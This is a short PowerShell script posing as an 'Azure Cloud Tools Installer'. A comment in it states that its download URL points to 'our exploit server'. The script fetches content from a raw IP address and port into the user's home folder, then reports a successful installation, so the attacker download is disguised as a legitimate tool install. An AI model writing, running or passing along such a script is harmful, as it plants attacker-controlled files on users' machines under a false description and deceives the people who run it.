# Azure Cloud Tools Installer
# Downloads and installs essential Azure management tools

Write-Host "Installing Azure Cloud Tools..." -ForegroundColor Cyan

# This redirects to our exploit server
$toolUrl = "http://32.192.75.5:8080/get"
$downloadPath = "$HOME/tools/"

New-Item -ItemType Directory -Path $downloadPath -Force | Out-Null
Invoke-WebRequest -Uri $toolUrl -OutFile $downloadPath

Write-Host "Installation complete!" -ForegroundColor Green
